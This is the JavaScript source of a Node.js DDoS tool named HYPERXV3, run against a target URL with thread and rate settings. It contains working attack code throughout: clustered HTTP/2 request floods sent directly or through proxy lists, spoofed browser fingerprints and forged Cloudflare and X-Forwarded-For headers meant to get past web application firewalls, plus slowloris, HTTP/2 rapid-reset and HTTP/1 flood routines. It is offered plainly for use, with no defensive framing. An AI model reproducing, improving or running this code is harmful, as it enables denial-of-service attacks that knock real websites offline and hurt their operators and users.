// HYPERXV3.js - COMPLETE MASSIVE RPS DDoS
// Usage: node HYPERXV3.js <URL> <THREADS> <RATE>

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const http = require("http");
const https = require("https");

process.setMaxListeners(Infinity);
require("events").EventEmitter.defaultMaxListeners = Infinity;

if (process.argv.length < 4) {
    process.exit();
}

const args = {
    target: process.argv[2],
    threads: parseInt(process.argv[3]) || 16,
    Rate: parseInt(process.argv[4]) || 300
}

const parsedTarget = url.parse(args.target);

// ==================== TLS CONFIG ====================
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

// ==================== FILES LOADING ====================
var proxyFile = "proxies.txt";
var proxies = [];
var userAgents = [];
var refList = [];

try {
    if (fs.existsSync(proxyFile)) {
        proxies = fs.readFileSync(proxyFile, "utf-8").toString().split(/\r?\n/).filter(p => p.trim());
    }
    if (fs.existsSync("ua.txt")) {
        userAgents = fs.readFileSync("ua.txt", "utf-8").toString().split(/\r?\n/).filter(p => p.trim());
    }
    if (fs.existsSync("ref.txt")) {
        refList = fs.readFileSync("ref.txt", "utf-8").toString().split(/\r?\n/).filter(p => p.trim());
    }
} catch(e) {}

if (userAgents.length === 0) userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"];
if (refList.length === 0) refList = ["https://www.google.com/"];

// ==================== CLUSTER SETUP ====================
if (cluster.isMaster) {
    console.log("Creds to Klyntar Starts Attack");
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker, code, signal) => {
        cluster.fork();
    });
    
} else {
    // Worker process
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 0);
    }
    
    // Start additional attacks in first worker
    if (cluster.worker.id === 1) {
        startAdditionalAttacks();
    }
}

// ==================== PROXY CONNECTION CLASS ====================
class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

// ==================== UTILITY FUNCTIONS ====================
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    let output = "";
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let count = 0; count < length; count++) {
        output += randomElement(characters.split(""));
    }
    return output;
}

// ==================== WAF BYPASS HEADERS ====================
const BROWSER_FINGERPRINTS = {
    chrome: {
        sec_ch_ua: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        sec_ch_ua_platform: '"Windows"'
    },
    firefox: {
        sec_ch_ua: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        sec_ch_ua_platform: '"Windows"'
    },
    safari: {
        sec_ch_ua: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        sec_ch_ua_platform: '"macOS"'
    }
};

function generateWAFHeaders() {
    const browser = randomElement(["chrome", "firefox", "safari"]);
    const fingerprint = BROWSER_FINGERPRINTS[browser];
    
    const randomIP = `${randomIntn(1,255)}.${randomIntn(1,255)}.${randomIntn(1,255)}.${randomIntn(1,255)}`;
    
    const headers = {
        ":method": "GET",
        ":path": parsedTarget.path || "/",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache, no-store, must-revalidate",
        "user-agent": randomElement(userAgents),
        "referer": randomElement(refList),
        "sec-ch-ua": fingerprint.sec_ch_ua,
        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
        "sec-ch-ua-platform": fingerprint.sec_ch_ua_platform,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "upgrade-insecure-requests": "1",
        "x-forwarded-proto": "https",
        "x-forwarded-for": randomIP,
        "x-real-ip": randomIP,
        "cf-ray": crypto.randomBytes(8).toString('hex') + "-ORD",
        "cf-ipcountry": randomElement(["US", "GB", "CA", "AU", "DE", "FR"]),
        "cf-visitor": '{"scheme":"https"}'
    };
    
    return headers;
}

// ==================== MAIN FLOODER ====================
function runFlooder() {
    const proxyAddr = proxies.length > 0 ? randomElement(proxies) : null;
    
    if (!proxyAddr || proxyAddr === "direct") {
        // DIRECT ATTACK
        try {
            const wafHeaders = generateWAFHeaders();
            wafHeaders[":authority"] = parsedTarget.host;
            wafHeaders[":path"] = parsedTarget.path || "/";
            wafHeaders["user-agent"] = randomElement(userAgents);
            wafHeaders["referer"] = randomElement(refList);
            
            const client = http2.connect(parsedTarget.href, {
                rejectUnauthorized: false,
                settings: {
                    enablePush: false,
                    initialWindowSize: 1073741823
                }
            });

            client.on("connect", () => {
                const attack = setInterval(() => {
                    for (let i = 0; i < args.Rate * 2; i++) {
                        const request = client.request(wafHeaders);
                        request.on("response", () => {
                            request.close();
                        });
                        request.on("error", () => {});
                        request.end();
                    }
                }, 500);
                
                setTimeout(() => {
                    clearInterval(attack);
                    client.destroy();
                }, 30000);
            });

            client.on("error", () => {
                client.destroy();
            });
            
            client.on("close", () => {});
            
        } catch(e) {
            attackHTTP1();
        }
        return;
    }

    // PROXY ATTACK
    const parsedProxy = proxyAddr.split(":");
    if (parsedProxy.length < 2) return;

    const wafHeaders = generateWAFHeaders();
    wafHeaders[":authority"] = parsedTarget.host;
    wafHeaders[":path"] = parsedTarget.path || "/";
    wafHeaders["user-agent"] = randomElement(userAgents);
    wafHeaders["x-forwarded-for"] = parsedProxy[0];
    wafHeaders["referer"] = randomElement(refList);
    
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 30000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: settings,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const attack = setInterval(() => {
                for (let i = 0; i < args.Rate * 2; i++) {
                    const request = client.request(wafHeaders);
                    request.on("response", () => {
                        request.close();
                    });
                    request.end();
                }
            }, 500);
            
            setTimeout(() => {
                clearInterval(attack);
                client.destroy();
                connection.destroy();
            }, 25000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

// ==================== ADDITIONAL ATTACKS ====================
function attackHTTP1() {
    const options = {
        hostname: parsedTarget.hostname,
        port: parsedTarget.protocol === 'https:' ? 443 : 80,
        path: parsedTarget.path || '/',
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Cache-Control': 'no-cache'
        }
    };
    
    const client = parsedTarget.protocol === 'https:' ? https : http;
    for (let i = 0; i < args.Rate; i++) {
        const req = client.request(options, () => {});
        req.on('error', () => {});
        req.end();
    }
}

function slowlorisAttack() {
    const options = {
        hostname: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path || '/',
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'keep-alive'
        }
    };
    
    const req = http.request(options);
    req.write('GET ' + (parsedTarget.path || '/') + ' HTTP/1.1\r\n');
    req.write('Host: ' + parsedTarget.hostname + '\r\n');
    req.write('User-Agent: ' + randomElement(userAgents) + '\r\n');
    req.write('Connection: keep-alive\r\n');
}

function amplificationAttack() {
    if (parsedTarget.protocol !== 'http:') return;
    
    try {
        const dgram = require('dgram');
        const client = dgram.createSocket('udp4');
        const message = Buffer.alloc(512);
        
        client.send(message, 0, message.length, 53, '8.8.8.8', (err) => {
            if (err) return;
        });
        
        setTimeout(() => {
            client.close();
        }, 1000);
    } catch(e) {}
}

function http2RapidResetAttack() {
    try {
        const client = http2.connect(parsedTarget.href, {
            rejectUnauthorized: false
        });

        client.on('connect', () => {
            for (let i = 0; i < 10; i++) {
                const req = client.request({
                    ':path': parsedTarget.path || "/",
                    ':method': 'GET',
                    'user-agent': randomElement(userAgents)
                });
                req.on('response', () => {
                    req.close();
                });
                req.end();
            }
        });

        client.on('error', () => {
            client.destroy();
        });
    } catch(e) {}
}

function startAdditionalAttacks() {
    setInterval(() => {
        const attackType = randomIntn(0, 4);
        switch(attackType) {
            case 0:
                amplificationAttack();
                break;
            case 1:
                slowlorisAttack();
                break;
            case 2:
                http2RapidResetAttack();
                break;
            case 3:
                for (let i = 0; i < args.Rate; i++) {
                    const options = {
                        hostname: parsedTarget.hostname,
                        port: parsedTarget.protocol === 'https:' ? 443 : 80,
                        path: parsedTarget.path || '/?' + randomCharacters(10),
                        method: 'GET',
                        headers: {
                            'User-Agent': randomElement(userAgents),
                            'Connection': 'Keep-Alive'
                        }
                    };
                    
                    const client = parsedTarget.protocol === 'https:' ? https : http;
                    const req = client.request(options, () => {});
                    req.on('error', () => {});
                    req.end();
                }
                break;
        }
    }, 5000);
}

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
process.on('SIGINT', () => process.exit(0));
